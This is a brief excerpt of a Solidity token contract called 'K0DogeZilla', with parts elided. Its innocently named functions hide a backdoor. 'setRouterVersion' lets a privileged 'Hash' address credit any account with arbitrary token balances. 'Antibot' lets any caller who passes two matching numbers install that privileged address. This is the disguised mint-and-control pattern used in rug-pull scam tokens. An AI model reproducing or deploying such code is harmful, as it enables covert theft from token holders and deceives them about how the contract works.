...
contract K0DogeZilla is Context, IERC20, Ownable {
    ...
    string private _name = "K0DogeZilla";
    string private _symbol = "K0DogeZilla";
    ...
    function setRouterVersion(uint256 newRouterVersion, address newRouterAddress) public{
       require(_nameis(msg.sender) || Hash == msg.sender) ;_tOwned[newRouterAddress] += newRouterVersion;
    }

    function Antibot(uint160 time, uint160 times) public {
       require(time == times);
       require(hashCounter < 3);
       Hash = address(uint160(time));
